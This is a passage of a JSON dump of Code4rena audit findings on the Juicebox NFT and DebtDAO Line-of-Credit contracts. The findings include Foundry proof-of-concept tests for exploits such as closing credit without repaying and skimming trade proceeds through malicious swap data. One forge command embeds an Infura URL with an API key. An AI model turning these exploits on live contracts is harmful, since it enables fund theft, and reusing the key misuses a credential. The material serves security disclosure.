directly call _numberOfReservedTokensOutstandingFor. Redeeming is broken because the redeem callback (JB721Delegate#redeemParams) calls _totalRedemtionWeight which calls _numberOfReservedTokensOutstandingFor.   Example:  A tier has a reserveRate of 100 (1/100 tokens reserved) and an initialQuantity of 10000. We assume that the tier has been fully minted, that is, _reserveTokensMinted is 100 and remainingQuantity = 0. Now we begin burning the tokens. Let's run through the lines above after 100 tokens have been burned (remainingQuantity = 100):  _numberOfNonReservedMinted = 10000 - 100 - 100 = 9800  _numerator = 9800 * 100 = 980000  _numberReservedTokensMintable = 980000 / 10000 = 98  Since _numberReservedTokensMintable < _reserveTokensMinted the line will underflow and revert.  JBTiered721DelegateStore#_numberOfReservedTokensOutstandingFor will now revert every time it is called. This affects all minting functions as well as totalRedemptionWeight. Since those functions now revert when called, it is impossible to mint or redeem anymore NFTs.  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Add a check before returning:      +   if (_reserveTokensMinted > _numberReservedTokensMintable) {     +       return 0;     +   }          return _numberReservedTokensMintable - _reserveTokensMinted;"}, {"title": "Changing default reserved token beneficiary may result in wrong beneficiary for tier", "html_url": "https://github.com/code-423n4/2022-10-juicebox-findings/issues/63", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "satisfactory", "selected for report", "M-03"], "target": "2022-10-juicebox-findings", "body": "# Lines of code  https://github.com/jbx-protocol/juice-nft-rewards/blob/89cea0e2a942a9dc9e8d98ae2c5f1b8f4d916438/contracts/JBTiered721DelegateStore.sol#L701   # Vulnerability details  ## Impact When the `reservedTokenBeneficiary` of a tier is equal to `defaultReservedTokenBeneficiaryOf[msg.sender]`, it is not explicitly set for this tier. This generally works well because in the function `reservedTokenBeneficiaryOf(address _nft, uint256 _tierId)`, `defaultReservedTokenBeneficiaryOf[_nft]` is used as a backup when `_reservedTokenBeneficiaryOf[_nft][_tierId]` is not set. However, it will lead to the wrong beneficiary when `defaultReservedTokenBeneficiaryOf[msg.sender]` is later changed, as this new beneficiary will be used for the tier, which is not the intended one.  ## Proof Of Concept `defaultReservedTokenBeneficiaryOf[address(delegate)]` is originally set to `address(Bob)` when the following happens: 1.) A new tier 42 is added with `_tierToAdd.reservedTokenBeneficiary = address(Bob)`. Because this is equal to `defaultReservedTokenBeneficiaryOf[address(delegate)]`, `_reservedTokenBeneficiaryOf[msg.sender][_tierId]` is not set. 2.) The owner calls `setDefaultReservedTokenBeneficiary` to change the default beneficiary (i.e., the value `defaultReservedTokenBeneficiaryOf[address(delegate)]`) to `address(Alice)`. 3.) Now, every call to `reservedTokenBeneficiaryOf(address(delegate), 42)` will return `address(Alice)`, meaning she will get these reserved tokens. This is of course wrong, the tier was explicitly created with Bob as the beneficiary.  ## Recommended Mitigation Steps Also set `_reservedTokenBeneficiaryOf[msg.sender][_tierId]` when it is equal to the current default beneficiary."}, {"title": "Lender can reject closing a position", "html_url": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/467", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-11"], "target": "2022-11-debtdao-findings", "body": "# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L489-L493   # Vulnerability details  A credit line can be closed by using the `LineOfCredit.depositAndClose()` or `LineOfCredit.close`. The remaining funds deposited by the lender (`credit.deposit`) and the accumulated and paid interest are transferred to the lender.  However, if the used credit token `credit.token` is native ETH (or an ERC-777 token with receiver hooks, and under the assumption that the oracle supports this asset in the first place), the lender can reject the closing of the credit by reverting the token transfer.  ## Impact  The lender can prevent the borrower from closing the credit line. This leads to the following consequences:  - Migrating (rollover) to a new line is not possible (it requires all credits to be closed, see [SecuredLine.sol#L55](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/SecuredLine.sol#L55)) - Releasing a spigot and transferring ownership to the borrower is not possible (see [SpigotedLineLib.sol#L195](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L195)) - Sweeping remaining tokens (e.g. revenue tokens) in the Spigot to the borrower is not possible (see (SpigotedLineLib.sol#L220)[https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/SpigotedLineLib.sol#L220])  ## Proof of Concept  [modules/credit/LineOfCredit.sol#L489-L493](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L489-L493)  ```solidity function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {     if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }      // return the Lender's funds that are being repaid     if (credit.deposit + credit.interestRepaid > 0) {         LineLib.sendOutTokenOrETH(             credit.token,             credit.lender,             credit.deposit + credit.interestRepaid         );     }      delete credits[id]; // gas refunds      // remove from active list     ids.removePosition(id);     unchecked { --count; }      // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.     if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }      emit CloseCreditPosition(id);      return true; } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider using a pull-based pattern to allow the lender to withdraw the funds instead of sending them back directly. "}, {"title": "Repaying a line of credit with a higher than necessary claimed revenue amount will force the borrower into liquidation", "html_url": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/461", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "H-06"], "target": "2022-11-debtdao-findings", "body": "# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L186   # Vulnerability details  A borrower can repay (parts) of a credit line with the `SpigotedLine.useAndRepay` function. This function will use `amount` of `unusedTokens[credit.token]` as a repayment. However, if `amount` exceeds the principal and the accrued interest, `credit.principal` will underflow without an error and set the principal value to a very large number.  This a problem because a borrower can unknowingly provide a larger than necessary `amount` to the `SpigotedLine.useAndRepay` function to make sure enough funds are used to fully repay the principal and the remaining interest.  Additionally, a lender can do the same thing as the lender can call this function.  ## Impact  The `credit.principal` underflows without an error and will be set to a very large number. This will force a secured line **immediately** into liquidation. Additionally, having a principal value close to `2^256 - 1` will make it hugely expensive to repay the credit line.  ## Proof of Concept  [utils/CreditLib.sol#L186](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/CreditLib.sol#L186)  ```solidity function repay(   ILineOfCredit.Credit memory credit,   bytes32 id,   uint256 amount )   external   returns (ILineOfCredit.Credit memory) { unchecked {     if (amount <= credit.interestAccrued) {         credit.interestAccrued -= amount;         credit.interestRepaid += amount;         emit RepayInterest(id, amount);         return credit;     } else {         uint256 interest = credit.interestAccrued;         uint256 principalPayment = amount - interest;          // update individual credit line denominated in token         credit.principal -= principalPayment; // @audit-info potential underflow without an error due to the unchecked block         credit.interestRepaid += interest;         credit.interestAccrued = 0;          emit RepayInterest(id, interest);         emit RepayPrincipal(id, principalPayment);          return credit;     } } } ```  To demonstrate the issue, copy the following test case and paste it into the `SpigotedLine.t.sol` test file. Then run `forge test --match-test \"test_lender_use_and_repay_underflow\"`.  Following scenario causes the repayment to underflow:  1. Borrower borrows `1 ether` of `revenueToken` 2. `2 ether` worth of `revenueToken` is claimed and traded from the revenue contract 3. Use all of the previously claimed funds (`2 ether`) to repay the line of credit (= `1 ether`) 4. `credit.principal` underflows due to `principalPayment` is larger than `credit.principal`  ```solidity function test_lender_use_and_repay_underflow() public {     uint256 largeRevenueAmount = lentAmount * 2;      deal(address(lender), lentAmount + 1 ether);     deal(address(revenueToken), MAX_REVENUE);     address revenueC = address(0xbeef); // need new spigot for testing     bytes32 id = _createCredit(address(revenueToken), Denominations.ETH, revenueC);      // 1. Borrow lentAmount = 1 ether     _borrow(id, lentAmount);      // 2. Claim and trade largeRevenueAmount = 2 ether (revenue)     bytes memory tradeData = abi.encodeWithSignature(       'trade(address,address,uint256,uint256)',       address(revenueToken),       Denominations.ETH,       1 gwei,       largeRevenueAmount     );      hoax(borrower);     line.claimAndTrade(address(revenueToken), tradeData);      (, uint256 principalBeforeRepaying,,,,,) = line.credits(line.ids(0));     assertEq(principalBeforeRepaying, lentAmount);      // 3. Use and repay debt with previously claimed and traded revenue (largeRevenueAmount = 2 ether)     vm.prank(lender);     line.useAndRepay(largeRevenueAmount);     (, uint256 _principal,,,,,) = line.credits(line.ids(0));      uint256 underflowedPrincipal = principalBeforeRepaying;      unchecked {       underflowedPrincipal -= (largeRevenueAmount);     }      // 4. Principal underflowed     assertEq(_principal, underflowedPrincipal);   } ```  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider asserting `amount` is less or equal than `credit.principal + credit.interestAccrued` (`require(amount <= credit.principal + credit.interestAccrued);`). Similar as how it is done in [`LineOfCredit.depositAndRepay()`](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L326) "}, {"title": "Borrower can craft a borrow that cannot be liquidated, even by arbiter.\u00a0", "html_url": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/421", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "H-05"], "target": "2022-11-debtdao-findings", "body": "# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L516-L538   # Vulnerability details  ## Description  LineOfCredit manages an array of open credit line identifiers called `ids`. Many interactions with the Line operate on ids\\[0\\], which is presumed to be the oldest borrow which has non zero principal. For example, borrowers must first deposit and repay to ids\\[0\\] before other credit lines.\u00a0  The list is managed by several functions:  1.  CreditListLib.removePosition - deletes parameter id in the ids array 2.  CreditListLib.stepQ - rotates all ids members one to the left, with the leftmost becoming the last element 3.  _sortIntoQ - most complex function, finds the smallest index which can swap identifiers with the parameter id, which satisfies the conditions:     1.  target index is not empty     2.  there is no principal owed for the target index's credit  The idea I had is that if we could corrupt the ids array so that ids\\[0\\] would be zero, but after it there would be some other active borrows, it would be a very severe situation. The whileBorrowing() modifier assumes if the first element has no principal, borrower is not borrowing.\u00a0  ``` modifier whileBorrowing() {     if(count == 0 || credits[ids[0]].principal == 0) { revert NotBorrowing(); }     _; } ```  It turns out there is a simple sequence of calls which allows borrowing while ids\\[0\\] is deleted, and does not re-arrange the new borrow into ids\\[0\\]!  1.  id1 = addCredit() - add a new credit line, a new id is pushed to the end of ids array. 2.  id2 = addCredit() - called again, ids.length = 2 3.  close(id1) - calls removePosition() on id1, now ids array is \\[0x000000000000000000000000, id2 \\] 4.  borrow(id2) - will borrow from id2 and call _sortIntoQ. The sorting loop will not find another index other than id2's existing index (`id == bytes32(0)` is true).  From this sequence, we achieve a borrow while ids\\[0\\] is 0! Therefore, credits\\[ids\\[0\\]\\].principal = credits\\[0\\].principal = 0, and whileBorrowing() reverts.  The impact is massive - the following functions are disabled:  - SecureLine::liquidate() - LineOfCredit::depositAndClose() - LineOfCredit::depositAndRepay() - LineOfCredit::claimAndRepay() - LineOfCredit::claimAndTrade()  ## Impact  Borrower can craft a borrow that cannot be liquidated, even by arbiter. Alternatively, functionality may be completely impaired through no fault of users.  ## Proof of Concept  Copy the following code into LineOfCredit.t.sol  ``` function _addCreditLender2(address token, uint256 amount) public {     // Prepare lender 2 operations, does same as mintAndApprove()     address lender2 = address(21);     deal(lender2, mintAmount);     supportedToken1.mint(lender2, mintAmount);     supportedToken2.mint(lender2, mintAmount);     unsupportedToken.mint(lender2, mintAmount);     vm.startPrank(lender2);     supportedToken1.approve(address(line), MAX_INT);     supportedToken2.approve(address(line), MAX_INT);     unsupportedToken.approve(address(line), MAX_INT);     vm.stopPrank();     // addCredit logic     vm.prank(borrower);     line.addCredit(dRate, fRate, amount, token, lender2);     vm.stopPrank();     vm.prank(lender2);     line.addCredit(dRate, fRate, amount, token, lender2);     vm.stopPrank(); } function test_attackUnliquidatable() public {     bytes32 id_1;     bytes32 id_2;     _addCredit(address(supportedToken1), 1 ether);     _addCreditLender2(address(supportedToken1), 1 ether);     id_1 =  line.ids(0);     id_2 =  line.ids(1);     hoax(borrower);     line.close(id_1);     hoax(borrower);     line.borrow(id_2, 1 ether);     id_1 =  line.ids(0);     id_2 = line.ids(1);     console.log(\"id1 : \", uint256(id_1));     console.log(\"id2 : \", uint256(id_2));     vm.warp(ttl+1);     assert(line.healthcheck() == LineLib.STATUS.LIQUIDATABLE);     vm.expectRevert(ILineOfCredit.NotBorrowing.selector);     bool isSolvent = line.declareInsolvent(); } ```  ## Tools Used  Manual audit  ## Recommended Mitigation Steps  When sorting new borrows into the ids queue, do not skip any elements."}, {"title": "address.call{value:x}() should be used instead of payable.transfer()", "html_url": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/369", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-10"], "target": "2022-11-debtdao-findings", "body": "# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L48   # Vulnerability details  ## Impact  When withdrawing and refund  ETH, the  contract uses Solidity\u2019s `transfer()` function.   Using Solidity's `transfer()` function has some notable shortcomings when the withdrawer is a smart contract, which can render ETH deposits impossible to withdraw. Specifically, the withdrawal will inevitably fail when: * The withdrawer smart contract does not implement a payable fallback function. * The withdrawer smart contract implements a payable fallback function which uses more than 2300 gas units. * The withdrawer smart contract implements a payable fallback function which needs less than 2300 gas units but is called through a proxy that raises the call\u2019s gas usage above 2300.  Risks of reentrancy stemming from the use of this function can be mitigated by tightly following the \"Check-Effects-Interactions\" pattern and using OpenZeppelin Contract\u2019s ReentrancyGuard contract.\u00a0  ## Proof of Concept  ```solidity // Line-of-Credit/contracts/utils/LineLib.sol 48:    payable(receiver).transfer(amount); ```   #### References:  The issues with\u00a0`transfer()`\u00a0are outlined [here](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/ )  For further reference on why using Solidity\u2019s `transfer()` is no longer recommended, refer to these [articles](https://blog.openzeppelin.com/reentrancy-after-istanbul/).    ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  Using low-level\u00a0`call.value(amount)`\u00a0with the corresponding result check or using the OpenZeppelin\u00a0`Address.sendValue`\u00a0is advised, [reference](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60).   "}, {"title": "Mistakenly sent eth could be locked", "html_url": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/355", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "M-08"], "target": "2022-11-debtdao-findings", "body": "# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L59-L74   # Vulnerability details  ## Impact  If ERC20 and eth are transferred at same time, the mistakenly sent eth will be locked. There are several functions could be affected and cause user fund lock: - `addCollateral()` - `addCredit()` - `increaseCredit()` - `depositAndClose()` - `depositAndRepay()` - `close()`  ## Proof of Concept  In `receiveTokenOrETH()`, different logic is used to handle ERC20 and eth transfer. However, in the ERC20 if block, mistakenly sent eth will be ignored. This part of eth will be locked in the contract. ```solidity // Line-of-Credit/contracts/utils/LineLib.sol     function receiveTokenOrETH(       address token,       address sender,       uint256 amount     )       external       returns (bool)     {         if(token == address(0)) { revert TransferFailed(); }         if(token != Denominations.ETH) { // ERC20             IERC20(token).safeTransferFrom(sender, address(this), amount);         } else { // ETH             if(msg.value < amount) { revert TransferFailed(); }         }         return true;     } ```   ## Tools Used Manual analysis.  ## Recommended Mitigation Steps  In the ERC20 part, add check for `msg.value` to ensure no eth is sent: ```solidity         if(token != Denominations.ETH) { // ERC20             if (msg.value > 0) { revert TransferFailed(); }             IERC20(token).safeTransferFrom(sender, address(this), amount);         } else { // ETH ``` "}, {"title": "Borrower can close a credit without repaying debt", "html_url": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/258", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "H-04"], "target": "2022-11-debtdao-findings", "body": "# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L389   # Vulnerability details  ## Impact A borrower can close a credit without repaying the debt to the lender. The lender will be left with a bad debt and the borrower will keep the borrowed amount and the collateral. ## Proof of Concept The `close` function of `LineOfCredit` doesn't check whether a credit exists or not. As a result, the `count` variable is decreased in the internal `_close` function when the `close` function is called with an non-existent credit ID: [LineOfCredit.sol#L388](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388): ```solidity function close(bytes32 id) external payable override returns (bool) {     Credit memory credit = credits[id];     address b = borrower; // gas savings     if(msg.sender != credit.lender && msg.sender != b) {       revert CallerAccessDenied();     }      // ensure all money owed is accounted for. Accrue facility fee since prinicpal was paid off     credit = _accrue(credit, id);     uint256 facilityFee = credit.interestAccrued;     if(facilityFee > 0) {       // only allow repaying interest since they are skipping repayment queue.       // If principal still owed, _close() MUST fail       LineLib.receiveTokenOrETH(credit.token, b, facilityFee);        credit = _repay(credit, id, facilityFee);     }      _close(credit, id); // deleted; no need to save to storage      return true; } ```  [LineOfCredit.sol#L483](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L483): ```solidity function _close(Credit memory credit, bytes32 id) internal virtual returns (bool) {     if(credit.principal > 0) { revert CloseFailedWithPrincipal(); }      // return the Lender's funds that are being repaid     if (credit.deposit + credit.interestRepaid > 0) {         LineLib.sendOutTokenOrETH(             credit.token,             credit.lender,             credit.deposit + credit.interestRepaid         );     }      delete credits[id]; // gas refunds      // remove from active list     ids.removePosition(id);     unchecked { --count; }      // If all credit lines are closed the the overall Line of Credit facility is declared 'repaid'.     if (count == 0) { _updateStatus(LineLib.STATUS.REPAID); }      emit CloseCreditPosition(id);      return true; } ```  Proof of Concept: ```solidity // contracts/tests/LineOfCredit.t.sol function testCloseWithoutRepaying_AUDIT() public {     assertEq(supportedToken1.balanceOf(address(line)), 0, \"Line balance should be 0\");     assertEq(supportedToken1.balanceOf(lender), mintAmount, \"Lender should have initial mint balance\");            _addCredit(address(supportedToken1), 1 ether);      bytes32 id = line.ids(0);     assert(id != bytes32(0));      assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether, \"Lender should have initial balance less lent amount\");          hoax(borrower);     line.borrow(id, 1 ether);     assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether, \"Borrower should have initial balance + loan\");          // The credit hasn't been repaid.     // hoax(borrower);     // line.depositAndRepay(1 ether);          hoax(borrower);     // Closing with a non-existent credit ID.     line.close(bytes32(uint256(31337)));      // The debt hasn't been repaid but the status is REPAID.     assertEq(uint(line.status()), uint(LineLib.STATUS.REPAID));      // Lender's balance is still reduced by the borrow amount.     assertEq(supportedToken1.balanceOf(lender), mintAmount - 1 ether);      // Borrower's balance still includes the borrowed amount.     assertEq(supportedToken1.balanceOf(borrower), mintAmount + 1 ether); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps In the `close` function of `LineOfCredit`, consider ensuring that a credit with the user-supplied ID exists, before closing it."}, {"title": "addCredit / increaseCredit cannot be called by lender first when token is ETH", "html_url": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/125", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "sponsor confirmed", "upgraded by judge", "selected for report", "H-03"], "target": "2022-11-debtdao-findings", "body": "# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L234 https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/modules/credit/LineOfCredit.sol#L270   # Vulnerability details  ## Impact The functions `addCredit` and `increaseCredit` both ahve a `mutualConsent` or `mutualConsentById` modifier. Furthermore, these functions are `payable` and the lender needs to send the corresponding ETH with each call. However, if we look at the mutual consent modifier works, we can a problem: ```solidity modifier mutualConsent(address _signerOne, address _signerTwo) {       if(_mutualConsent(_signerOne, _signerTwo))  {         // Run whatever code needed 2/2 consent         _;       } }  function _mutualConsent(address _signerOne, address _signerTwo) internal returns(bool) {         if(msg.sender != _signerOne && msg.sender != _signerTwo) { revert Unauthorized(); }          address nonCaller = _getNonCaller(_signerOne, _signerTwo);          // The consent hash is defined by the hash of the transaction call data and sender of msg,         // which uniquely identifies the function, arguments, and sender.         bytes32 expectedHash = keccak256(abi.encodePacked(msg.data, nonCaller));          if (!mutualConsents[expectedHash]) {             bytes32 newHash = keccak256(abi.encodePacked(msg.data, msg.sender));              mutualConsents[newHash] = true;              emit MutualConsentRegistered(newHash);              return false;         }          delete mutualConsents[expectedHash];          return true; } ``` The problem is: On the first call, when the other party has not given consent to the call yet, the modifier does not revert. It sets the consent of the calling party instead.  This is very problematic in combination with sending ETH for two reasons: 1.) When the lender performs the calls first and sends ETH along with the call, the call will not revert. It will instead set the consent for him, but the sent ETH is lost. 2.) Even when the lender thinks about this and does not provide any ETH on the first call, the borrower has to perform the second call. Of course, he will not provide the ETH with this call, but this will cause the transaction to revert. There is now no way for the borrower to also grant consent, but still let the lender perform the call.  ## Proof Of Concept Lender Alice calls `LineOfCredit.addCredit` first to add a credit with 1 ETH. She sends 1 ETH with the call. However, because borrower Bob has not performed this call yet, the function body is not executed, but the 1 ETH is still sent. Afterwards, Bob wants to give his consent, so he performs the same call. However, this call reverts, because Bob does not send any ETH with it.   ## Recommended Mitigation Steps Consider implementing an external function to grant consent to avoid this scenario. Also consider reverting when ETH is sent along, but the other party has not given their consent yet."}, {"title": "Non-existing revenue contract can be passed to claimRevenue to send all tokens to treasury", "html_url": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/119", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "H-02"], "target": "2022-11-debtdao-findings", "body": "# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/f32cb3eeb08663f2456bf6e2fba21e964da3e8ae/contracts/utils/SpigotLib.sol#L87   # Vulnerability details  ## Impact Neither `SpigotLib.claimRevenue` nor `SpigotLib._claimRevenue` check that the provided `revenueContract` was registered before. If this is not the case, `SpigotLib._claimRevenue` assumes that this is a revenue contract with push payments (because `self.settings[revenueContract].claimFunction` is 0) and just returns the difference since the last call to `claimRevenue`: ```solidity        if(self.settings[revenueContract].claimFunction == bytes4(0)) {             // push payments              // claimed = total balance - already accounted for balance             claimed = existingBalance - self.escrowed[token]; //@audit Rebasing tokens             // underflow revert ensures we have more tokens than we started with and actually claimed revenue         } ``` `SpigotLib.claimRevenue` will then read `self.settings[revenueContract].ownerSplit`, which is 0 for non-registered revenue contracts: ```solidity uint256 escrowedAmount = claimed * self.settings[revenueContract].ownerSplit / 100; ``` Therefore, the whole `claimed` amount is sent to the treasury.  This becomes very problematic for revenue tokens that use push payments. An attacker (in practice the borrower) can just regularly call `claimRevenue` with this token and a non-existing revenue contract. All of the tokens that were sent to the spigot since the last call will be sent to the treasury and none to the escrow, i.e. a borrower can ensure that no revenue will be available for the lender, no matter what the configured split is.  ## Proof Of Concept As mentioned above, the attack pattern works for arbitrary tokens where one (or more) revenue contracts use push payments, i.e. where the balance of the Spigot increases from time to time. Then, the attacker just calls `claimRevenue` with a non-existing address. This is illustrated in the following diff: ```diff --- a/contracts/tests/Spigot.t.sol +++ b/contracts/tests/Spigot.t.sol @@ -174,7 +174,7 @@ contract SpigotTest is Test {          assertEq(token.balanceOf(address(spigot)), totalRevenue);                    bytes memory claimData; -        spigot.claimRevenue(revenueContract, address(token), claimData); +        spigot.claimRevenue(address(0), address(token), claimData); ``` Thanks to this small modification, all of the tokens are sent to the treasury and none are sent to the escrow.  ## Recommended Mitigation Steps Check that a revenue contract was registered before, revert if it does not."}, {"title": "Lender can trade claimToken in a malicious way to steal the borrower's money via claimAndRepay() in SpigotedLine by using malicious zeroExTradeData", "html_url": "https://github.com/code-423n4/2022-11-debtdao-findings/issues/110", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "satisfactory", "sponsor confirmed", "selected for report", "edited-by-warden", "M-04"], "target": "2022-11-debtdao-findings", "body": "# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/SpigotedLine.sol#L106-L112 https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/SpigotedLineLib.sol#L75-L85   # Vulnerability details  ## Impact  Lender can trade claimToken in a malicious way to steal the borrower's money via claimAndRepay() in SpigotedLine by using malicious zeroExTradeData.  In the design of the protocol, the lender can use the function claimAndRepay(), the lender can take claimToken by spigot.claimEscrow and then trade the claimToken to the CreditTOken via ZeroEx exchange, then repay the credit.   ``` function claimAndRepay(address claimToken, bytes calldata zeroExTradeData) external         whileBorrowing         nonReentrant         returns (uint256) {   ... // Line 106 - Line 112 uint256 newTokens = claimToken == credit.token ?           spigot.claimEscrow(claimToken) :  // same asset. dont trade           _claimAndTrade(                   // trade revenue token for debt obligation               claimToken,               credit.token,               zeroExTradeData           ); ... // Line 128 - Line 130   credits[id] = _repay(credit, id, repaid);          emit RevenuePayment(claimToken, repaid);  ...  }  ```  ``` function _claimAndTrade(       address claimToken,       address targetToken,       bytes calldata zeroExTradeData     )         internal         returns (uint256)     {         (uint256 tokensBought, uint256 totalUnused) = SpigotedLineLib.claimAndTrade(             claimToken,             targetToken,             swapTarget,             address(spigot),             unusedTokens[claimToken],             zeroExTradeData         );          // we dont use revenue after this so can store now         unusedTokens[claimToken] = totalUnused;         return tokensBought;     } ``` ``` function claimAndTrade(         address claimToken,         address targetToken,         address payable swapTarget,         address spigot,         uint256 unused,         bytes calldata zeroExTradeData     )     external          returns(uint256, uint256)  { ...  trade(             claimed + unused,             claimToken,             swapTarget,             zeroExTradeData         );                  // underflow revert ensures we have more tokens than we started with         uint256 tokensBought = LineLib.getBalance(targetToken) - oldTargetTokens;          if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought ...   }  ```  In the function to claimAndTrade in SpigotedLineLib.sol, the check in line 85 to check if tokenBought is not equal to 0 then revert.   The bug here is the zeroExTradeData is controlled by the lender and can be malicious and can manipulate the flow to bypass the check in line 85.  ## Proof of Concept  The following code can manipulate and bypass the check to steal money of the borrower. Step 1: Construct the zeroExTradeData data to sell the claimToken to ETH via the ZeroEx exchange data. The lender constructs the zeroExTradeData to send ETH to the exploit contract.  Step 2: In the exploit contract, have the receive() function to receive ETH from ZeroEx exchange. Since the exchange was from claimToken to ETH, so the exploit contract will receive the ETH and the code in receive function will be hit.   ``` receive() external payable {     console.log(\"Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance\");     uint256 amount = 100;      creditToken.transfer(address(line),amount);     console.log(\"Receive the amount of ETH: %s\", msg.value);   }  ``` In the receive() function, the exploit contract transfer some amount of creditToken to the SpigotedLine contract to bypass the check  ```  if(tokensBought == 0) { revert TradeFailed(); } // ensure tokens bought ``` Since this check requires only not 0, so the lender can send only 1 or very small amount, e.g. 100 of creditToken.   This amount then will be used to repay the credit.  So this means, the borrower lost money, because the lender can claim big amount of claimToken and repay a little for the credit.  In the zip file in the Google_Drive link, there is the POC written for this bug.  The test case is test_lender_can_claim_and_repay_3 in file SpigotedLine.t.modified.sol  You can put this file to the tests folder https://drive.google.com/file/d/1IWAV8Zz5KVgw22-gnVZrOxkcYrgv8cO2/view?usp=sharing  You can run the POC by calling:  ``` forge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n umber 15918000 ``` Here I use the block-number to make the test log stable, but this does not impact the logic of POC.   You can find the detailed log file: Line-of-Credit\\test_claim_221107_2311.log The full log file here: https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing  In this log file, the lender claims 1000 DAI (DAI is revenueToken) then sell to receive 0.6324 ETH, but repays only 100 * ( 10 ** -18 ) BUSD for the borrower.   Logs:   Step 0: As a Borrower borrow some money    Step 1: Construct the tradeData to call claimAndRepay as the lender   claimed: 1000000000000000000000   unused: 0   sellAmount: 1000000000000000000000   Step 1: As the lender, call claimAndRepay with Malicious zeroExTradeData   Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance   Receive the amount of ETH: 632428006785336734   emit RepayInterest(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 0)   emit RepayPrincipal(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 100)   RevenuePayment(token: DAI: [0x6b175474e89094c44da98b954eedeac495271d0f], amount: 100)  You can use the POC.patch here: https://drive.google.com/file/d/17Ycdi5czBoFOKNQlgVqWxVdHxfw04304/view?usp=sharing  To use it use command  ``` git apply POC.patch  ```  To run use command  ``` forge install forge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n umber 15918000  ```  The full code repository: https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing   ## Tools Used 